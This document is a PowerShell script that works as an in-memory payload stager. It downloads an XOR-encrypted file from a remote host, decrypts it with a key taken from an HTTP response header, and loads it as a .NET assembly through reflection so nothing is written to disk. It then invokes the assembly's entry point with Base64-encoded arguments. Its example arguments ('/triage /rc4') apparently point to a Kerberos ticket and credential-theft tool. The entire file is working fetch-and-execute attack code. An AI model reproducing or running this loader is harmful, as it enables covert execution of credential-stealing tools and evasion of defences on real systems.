param(
    [string]$EncodedArgs = $null   # Base64 args (e.g. "/triage /rc4:`"AAAAAAA`"") ("/help" --> "L2hlbHA=")
)

$ServerToken = "a-long-random-token"
$Url = "http://host:8080/download"

$req = [System.Net.HttpWebRequest]::Create($Url)
$req.Method = 'GET'
$req.Headers.Add('Authorization', "Bearer $ServerToken")

try {
    $resp = $req.GetResponse()
    
    $keyHeader = $resp.Headers['Authorization']
    if (-not $keyHeader) {
        throw "The server did not return the 'Authorization' header with the key"
    }
    $keyBytes = [Convert]::FromBase64String($keyHeader)

    $stream = $resp.GetResponseStream()
    $ms = New-Object System.IO.MemoryStream
    $stream.CopyTo($ms)
    $encBytes = $ms.ToArray()
    
    $ms.Close()
    $stream.Close()
    $resp.Close()
}
catch {
    Write-Error "Failed to download or read the key: $_"
    exit 1
}

function xorWithKey([byte[]]$data, [byte[]]$key) {
    for ($i = 0; $i -lt $data.Length; $i++) {
        $data[$i] = $data[$i] -bxor $key[$i % $key.Length]
    }
}

xorWithKey $encBytes $keyBytes

function LoadAssembly {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [string[]]$asmNames,
        [string]$baseDir = $PSScriptRoot
    )
    begin {
        $domain = [System.AppDomain]::CurrentDomain
        [Reflection.Assembly[]]$asms = $domain.GetAssemblies()
        $cache = New-Object "System.Collections.Generic.HashSet[string]" (,[string[]]$asms.GetName().Name)
        
        $path = $domain.getType().Assembly.Location
        $searchPath = @($baseDir, ([IO.FileInfo]$path).Directory.FullName)
    }
    process {
        foreach ($asmName in $asmNames) {
            LoadAssemblyInternal $asmName $searchPath $cache
        }
    }
}

function LoadAssemblyInternal([string]$asmName, [string[]]$searchPath, $cache) {
    if (-not $cache.Contains($asmName)) {
        $path = Get-ChildItem -Path $searchPath -Filter "$asmName.dll" -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($path -ne $null) {
            Write-Verbose "Try Loading: $path"
            [byte[]]$binary = [System.IO.File]::ReadAllBytes($path.FullName)
            $asm = [System.Reflection.Assembly]::Load($binary)
            Write-Verbose "Loaded: $($asm.FullName)"
            $cache.Add($asm.GetName().Name) | Out-Null
            LoadAssemblyInternal $asm.GetReferencedAssemblies().Name $searchPath $cache
            return $asm
        }
    }
    return $null
}

function LoadAssemblyFromBytes {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [byte[]]$Bytes,
        [string]$baseDir = $PSScriptRoot,
        [string[]]$Arguments = $null
    )
    begin {
        $domain = [System.AppDomain]::CurrentDomain
        [Reflection.Assembly[]]$asms = $domain.GetAssemblies()
        $cache = New-Object "System.Collections.Generic.HashSet[string]" (,[string[]]$asms.GetName().Name)
        
        $path = $domain.getType().Assembly.Location
        $searchPath = @($baseDir, ([IO.FileInfo]$path).Directory.FullName)
    }
    process {
        $asm = [System.Reflection.Assembly]::Load($Bytes)
        Write-Verbose "Loaded from bytes: $($asm.FullName)"
        $cache.Add($asm.GetName().Name) | Out-Null

        foreach ($refName in $asm.GetReferencedAssemblies().Name) {
            LoadAssemblyInternal $refName $searchPath $cache
        }

        if ($Arguments -and $asm.EntryPoint) {
            Write-Verbose "Invoking entry point with $($Arguments.Count) argument(s)"
            $result = $asm.EntryPoint.Invoke($null, (,$Arguments))
            if ($result -ne $null) {
                exit $result
            }
        }
    }
}

function Split-CommandLine {
    [CmdletBinding()]
    param([string]$cmdLine)
    $result = @()
    $current = ""
    $inQuotes = $false
    $i = 0
    while ($i -lt $cmdLine.Length) {
        $c = $cmdLine[$i]
        if ($c -eq '"') {
            if ($inQuotes -and $i + 1 -lt $cmdLine.Length -and $cmdLine[$i + 1] -eq '"') {
                $current += '"'
                $i += 2
            } else {
                $inQuotes = -not $inQuotes
                $i++
            }
        } elseif ($c -eq ' ' -and -not $inQuotes) {
            if ($current) {
                $result += $current
                $current = ""
            }
            $i++
        } else {
            $current += $c
            $i++
        }
    }
    if ($current) { $result += $current }
    return $result
}

$argArray = @()
if ($EncodedArgs) {
    try {
        $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncodedArgs))
        Write-Verbose "Decoded arguments: $decoded"
        $argArray = Split-CommandLine $decoded
    } catch {
        Write-Error "Failed to decode Base64 arguments: $_"
        exit 1
    }
}

LoadAssemblyFromBytes -Bytes $encBytes -Arguments $argArray